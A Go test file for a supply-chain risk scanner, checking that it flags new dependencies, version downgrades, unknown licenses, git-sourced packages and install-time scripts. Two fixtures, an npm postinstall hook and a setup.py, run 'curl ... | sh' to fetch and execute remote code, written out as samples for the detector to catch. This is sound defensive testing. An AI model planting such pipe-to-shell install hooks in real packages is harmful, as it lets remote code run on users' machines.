package supplychain

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/Calsoft-Pvt-Ltd/calvigil/internal/models"
)

func TestDiffReportsFlagsNewDirectDependencyAndDowngrade(t *testing.T) {
	baseline := &models.ScanResult{
		ProjectPath: "/repo",
		Packages: []models.Package{
			{Name: "lodash", Version: "4.17.21", Ecosystem: models.EcosystemNpm, FilePath: "/repo/package-lock.json", PURL: "pkg:npm/lodash@4.17.21"},
			{Name: "axios", Version: "1.7.0", Ecosystem: models.EcosystemNpm, FilePath: "/repo/package-lock.json", PURL: "pkg:npm/axios@1.7.0"},
		},
	}
	target := &models.ScanResult{
		ProjectPath: "/repo",
		Packages: []models.Package{
			{Name: "lodash", Version: "4.17.20", Ecosystem: models.EcosystemNpm, FilePath: "/repo/package-lock.json", PURL: "pkg:npm/lodash@4.17.20"},
			{Name: "leftpad-secure", Version: "1.0.0", Ecosystem: models.EcosystemNpm, FilePath: "/repo/package-lock.json", PURL: "pkg:npm/leftpad-secure@1.0.0"},
		},
	}

	risk := DiffReports(context.Background(), baseline, target)
	if risk == nil {
		t.Fatal("risk is nil")
	}
	if risk.FindingCount < 2 {
		t.Fatalf("finding count = %d, want at least 2", risk.FindingCount)
	}
	if !hasFinding(risk, "SCM-101") {
		t.Fatal("expected SCM-101 new direct dependency finding")
	}
	if !hasFinding(risk, "SCM-102") {
		t.Fatal("expected SCM-102 downgrade finding")
	}
	if risk.Decision != DecisionReviewBeforeMerge {
		t.Fatalf("decision = %s, want %s", risk.Decision, DecisionReviewBeforeMerge)
	}
}

func TestAnalyzeFlagsNPMInstallBehaviorAndSuspiciousMetadata(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, filepath.Join(dir, "package.json"), `{
  "dependencies": {
    "danger-pkg": "^1.0.0",
    "git-pkg": "git+https://github.com/acme/pkg.git"
  },
  "scripts": {
    "postinstall": "curl https://example.com/install.sh | sh"
  }
}`)
	writeFile(t, filepath.Join(dir, "package-lock.json"), `{
  "lockfileVersion": 3,
  "packages": {
    "": {"dependencies": {"danger-pkg": "^1.0.0", "git-pkg": "git+https://github.com/acme/pkg.git"}},
    "node_modules/danger-pkg": {
      "version": "1.0.0",
      "resolved": "https://registry.npmjs.org/danger-pkg/-/danger-pkg-1.0.0.tgz",
      "hasInstallScript": true
    },
    "node_modules/git-pkg": {
      "version": "2.0.0",
      "resolved": "git+https://github.com/acme/pkg.git"
    }
  }
}`)

	result := &models.ScanResult{
		ProjectPath:   dir,
		ScannedAt:     time.Now(),
		TotalPackages: 2,
		Packages: []models.Package{
			{Name: "danger-pkg", Version: "1.0.0", Ecosystem: models.EcosystemNpm, FilePath: filepath.Join(dir, "package-lock.json"), PURL: "pkg:npm/danger-pkg@1.0.0", License: "MIT"},
			{Name: "git-pkg", Version: "2.0.0", Ecosystem: models.EcosystemNpm, FilePath: filepath.Join(dir, "package-lock.json"), PURL: "pkg:npm/git-pkg@2.0.0", License: "MIT"},
		},
	}

	risk := Analyze(context.Background(), result, Options{ProjectPath: dir, Offline: true})
	for _, want := range []string{"SCM-202", "SCM-203", "SCM-301", "SCM-302"} {
		if !hasFinding(risk, want) {
			t.Fatalf("expected %s finding in %+v", want, risk.Findings)
		}
	}
	if risk.Score == 0 {
		t.Fatal("score should be non-zero")
	}
}

func TestAnalyzeUnknownDirectLicenseNamesPackageAction(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, filepath.Join(dir, "package.json"), `{"dependencies":{"mystery-pkg":"1.0.0"}}`)
	writeFile(t, filepath.Join(dir, "package-lock.json"), `{
  "lockfileVersion": 3,
  "packages": {
    "": {"dependencies": {"mystery-pkg": "1.0.0"}},
    "node_modules/mystery-pkg": {
      "version": "1.0.0",
      "resolved": "https://registry.npmjs.org/mystery-pkg/-/mystery-pkg-1.0.0.tgz"
    }
  }
}`)

	result := &models.ScanResult{
		ProjectPath: dir,
		Packages: []models.Package{
			{Name: "mystery-pkg", Version: "1.0.0", Ecosystem: models.EcosystemNpm, FilePath: filepath.Join(dir, "package-lock.json"), PURL: "pkg:npm/mystery-pkg@1.0.0"},
		},
	}

	risk := Analyze(context.Background(), result, Options{ProjectPath: dir, Offline: true})
	finding := findFinding(risk, "SCM-201")
	if finding == nil {
		t.Fatalf("expected SCM-201 finding in %+v", risk)
	}
	for _, got := range []string{finding.Description, finding.Evidence, finding.Recommendation} {
		if !strings.Contains(got, "mystery-pkg@1.0.0") {
			t.Fatalf("finding text %q does not name package version", got)
		}
	}
}

func TestAnalyzeFlagsPythonSetupExecution(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, filepath.Join(dir, "setup.py"), `from setuptools import setup
import os
os.system("curl https://example.com/bootstrap.sh | sh")
setup(name="demo")`)

	result := &models.ScanResult{
		ProjectPath: dir,
		Packages: []models.Package{
			{Name: "demo", Version: "0.1.0", Ecosystem: models.EcosystemPyPI, FilePath: filepath.Join(dir, "requirements.txt"), PURL: "pkg:pypi/demo@0.1.0", License: "MIT"},
		},
	}

	risk := Analyze(context.Background(), result, Options{ProjectPath: dir, Offline: true})
	if !hasFinding(risk, "SCM-303") {
		t.Fatalf("expected SCM-303 finding, got %+v", risk.Findings)
	}
}

func hasFinding(risk *models.SupplyChainRisk, id string) bool {
	return findFinding(risk, id) != nil
}

func findFinding(risk *models.SupplyChainRisk, id string) *models.SupplyChainFinding {
	if risk == nil {
		return nil
	}
	for i := range risk.Findings {
		finding := &risk.Findings[i]
		if finding.ID == id {
			return finding
		}
	}
	return nil
}

func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("write %s: %v", path, err)
	}
}
